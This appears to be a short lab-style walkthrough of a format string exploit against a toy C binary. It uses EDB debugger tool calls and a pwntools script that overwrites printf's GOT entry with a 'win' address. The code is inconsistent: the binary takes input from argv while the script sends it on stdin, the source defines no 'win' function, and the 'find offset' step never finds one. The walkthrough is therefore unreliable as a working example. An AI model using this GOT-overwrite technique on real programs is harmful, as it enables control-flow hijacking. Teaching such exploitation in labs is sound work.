# Format String — Arbitrary Write via pwntools

A format string vulnerability exploitation walkthrough using EDB MCP + pwntools tools.

## The Binary

```c
void vuln(char *input) {
    char buf[128];
    snprintf(buf, 128, input);  // format string bug
    printf("%s", buf);
}
int main(int argc, char *argv[]) {
    vuln(argc > 1 ? argv[1] : "%p");
    return 0;
}
```

## Walkthrough

### 1. Find offset on stack

```
pwntools_fmtstr_payload(offset=6, writes={"0x601000": 0x401196})
```

### 2. Test with printf

```
edb_set_breakpoint(location="vuln")
edb_run()
edb_evaluate_expression(expression="printf(\"%p %p %p %p %p %p\")")
```

### 3. Generate format string payload

```
# Overwrite GOT entry with win function address
pwntools_fmtstr_payload(
    offset=6,
    writes={"<got_entry>": "<win_addr>"}
)
```

## Exploit Script

```python
from pwn import *

elf = ELF("/tmp/format")
win_addr = elf.symbols["win"]
got_printf = elf.got["printf"]

payload = fmtstr_payload(6, {got_printf: win_addr})

p = process("/tmp/format")
p.sendline(payload)
print(p.recvall().decode())
```
